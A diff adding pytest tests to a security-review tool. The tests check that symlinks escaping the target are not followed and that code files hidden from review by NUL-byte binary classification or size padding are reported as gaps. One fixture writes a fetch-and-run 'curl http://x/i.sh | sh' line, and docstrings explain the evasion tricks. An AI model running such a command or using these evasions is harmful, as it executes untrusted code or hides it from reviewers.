@@ -272,6 +272,170 @@ def test_a_package_json_symlinked_outside_the_target_is_not_read(tmp_path: Path)
     assert declared == [], f"read through a symlink leaving the target: {declared}"
 
 
+# --- the same class, at the five sites D1 did not reach ------------------
+#
+# D1 added `and not ...is_symlink()` at each of the four sites a review had
+# demonstrated. A second review walked through five more, because the class is
+# *reaching by name* and a per-site patch cannot close it: every field that
+# looks a file up is a new hole, and the check has to be remembered rather than
+# inherited. Those fields now come from `_found_paths`, which is what the walk
+# found, so a site that forgets to use it fails closed.
+
+
+def _linked_target(tmp_path: Path, name: str, outside_body: str, outside_name: str) -> Path:
+    """A target whose `name` is a symlink to a file outside it."""
+    outside = tmp_path / "outside"
+    outside.mkdir(exist_ok=True)
+    (outside / outside_name).write_text(outside_body, encoding="utf-8")
+
+    target = tmp_path / "target"
+    target.mkdir(exist_ok=True)
+    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
+    link = target / name
+    link.parent.mkdir(parents=True, exist_ok=True)
+    try:
+        link.symlink_to(outside / outside_name)
+    except OSError:  # pragma: no cover - filesystem-dependent
+        pytest.skip("filesystem does not support symlinks")
+    return target
+
+
+def test_a_symlinked_security_policy_is_not_claimed_as_the_targets(tmp_path: Path) -> None:
+    """`security_md` was `(root / "SECURITY.md").is_file()`, and `is_file()`
+    follows the link — so `SECURITY.md -> /etc/passwd` reported that a target
+    with no security policy had one. A claim about someone else's filesystem,
+    presented as a property of this tree."""
+    target = _linked_target(tmp_path, "SECURITY.md", "# theirs\n", "real.md")
+    assert recon(target).security_process["security_md"] is False
+
+
+def test_a_symlinked_dependabot_config_is_not_claimed(tmp_path: Path) -> None:
+    """The same shape, and the site the review did not name — which is the
+    point: the class produces sites faster than a reviewer names them."""
+    target = _linked_target(tmp_path, ".github/dependabot.yml", "version: 2\n", "real.yml")
+    assert recon(target).security_process["dependabot"] is False
+
+
+def test_a_symlinked_sast_config_is_not_claimed(tmp_path: Path) -> None:
+    """And the fifth. `_SAST_CONFIG` was checked with a bare `is_file()` in a
+    generator expression, which is the easiest place of all for a symlink test
+    to be left out."""
+    target = _linked_target(tmp_path, ".semgrep.yml", "rules: []\n", "real.yml")
+    assert recon(target).security_process["sast_config"] is False
+
+
+def test_workflows_are_not_read_through_a_symlinked_github_directory(tmp_path: Path) -> None:
+    """`Path.glob` follows a symlinked directory, so `.github -> /somewhere`
+    copied a foreign directory's workflow filenames into `recon.json` under this
+    target's name — reported in a field a reader takes as a statement about the
+    tree in front of them."""
+    outside = tmp_path / "outside"
+    (outside / "workflows").mkdir(parents=True)
+    (outside / "workflows" / "secret-deploy.yml").write_text("on: push\n", encoding="utf-8")
+
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
+    try:
+        (target / ".github").symlink_to(outside, target_is_directory=True)
+    except OSError:  # pragma: no cover - filesystem-dependent
+        pytest.skip("filesystem does not support symlinks")
+
+    workflows = recon(target).entrypoints["workflows"]
+    assert workflows == [], f"globbed through a symlinked directory: {workflows}"
+
+
+def test_a_ref_reached_through_a_symlinked_component_is_refused(tmp_path: Path) -> None:
+    """The sharpest of the five, because it decides where the review is filed.
+
+    `_resolve_ref` tested `loose.is_symlink()`, which lstats the *last*
+    component only. `.git/refs -> ../../outside/refs` therefore passed a check
+    written on `.git/refs/heads/main`, and a foreign repository's SHA was
+    reported as this target's version — which `STACK.md` §6 turns into the
+    workspace directory, filing one tree's review under another's history.
+    """
+    outside = tmp_path / "outside"
+    (outside / "refs" / "heads").mkdir(parents=True)
+    (outside / "refs" / "heads" / "main").write_text("a" * 40 + "\n", encoding="utf-8")
+
+    target = tmp_path / "target"
+    (target / ".git").mkdir(parents=True)
+    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
+    (target / ".git" / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
+    try:
+        (target / ".git" / "refs").symlink_to(outside / "refs", target_is_directory=True)
+    except OSError:  # pragma: no cover - filesystem-dependent
+        pytest.skip("filesystem does not support symlinks")
+
+    source, sha = git_identity(target)
+    assert (source, sha) == ("directory", None), f"resolved a ref outside the target: {sha}"
+
+
+# --- a target may not remove a code file from review and get a clean run ---
+
+
+def test_a_code_file_classified_binary_is_named_as_a_gap(tmp_path: Path) -> None:
+    """A3 raised the cost of this evasion from one byte to eight and called the
+    class closed. Eight NUL bytes in a comment is 12% of a short script, over
+    the 5% threshold, so `install.sh` carrying `curl | sh` left the review with
+    `0 candidates` and nothing anywhere naming it.
+
+    Worse than silence: the skipped file contributes no language, so
+    `coverage_gaps` read "no coverage for: markdown" — the one honest-looking
+    line in the artifact described a tree that did not exist.
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    # Eight, as a count rather than a run of escapes — the number is the whole
+    # finding, and 12% of this file is over the 5% threshold.
+    hidden = b"#!/bin/sh\n# note" + b"\x00" * 8 + b"\necho hi\n"
+    (target / "install.sh").write_bytes(hidden)
+    (target / "readme.md").write_text("# docs\n", encoding="utf-8")
+
+    result = recon(target)
+
+    assert result.inventory["binary"] == ["install.sh"]
+    assert result.inventory["unread_code"] == ["install.sh"]
+    assert any("install.sh" in line for line in result.coverage_gaps)
+
+
+def test_a_code_file_over_the_size_bound_is_named_as_a_gap(tmp_path: Path) -> None:
+    """The same evasion by padding rather than by classification. Both end in a
+    file present in the tree, absent from review, and — before this — absent
+    from every line a reviewer reads."""
+    target = tmp_path / "target"
+    target.mkdir()
+    body = "curl http://x/i.sh | sh\n" + "# pad\n" * 200
+    (target / "install.sh").write_text(body, encoding="utf-8")
+
+    result = recon(target, max_bytes=200)
+
+    assert result.inventory["too_large"] == ["install.sh"]
+    assert result.inventory["unread_code"] == ["install.sh"]
+    assert any("install.sh" in line for line in result.coverage_gaps)
+
+
+def test_an_ordinary_binary_asset_is_not_counted_as_unread_code(tmp_path: Path) -> None:
+    """The control, and the reason the exit code keys on `unread_code` rather
+    than on "anything unread".
+
+    A PNG is binary in every ordinary target. Exiting 2 on `binary` alone would
+    light the signal on almost every run, and an exit code that is always on is
+    one people stop reading — the H-1 habit in a new place. The distinction is
+    the extension: a shell script classified binary had something removed from
+    review that a reviewer expected to be in it (P11); a PNG did not.
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(64))
+    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
+
+    result = recon(target)
+
+    assert result.inventory["binary"] == ["logo.png"]
+    assert result.inventory["unread_code"] == []
+
+
 def test_a_git_directory_symlinked_outside_the_target_is_not_followed(tmp_path: Path) -> None:
     """`git_identity` tests `git_dir.is_dir()`, which follows the link. A
     target linking `.git` at another checkout took that repository's HEAD and
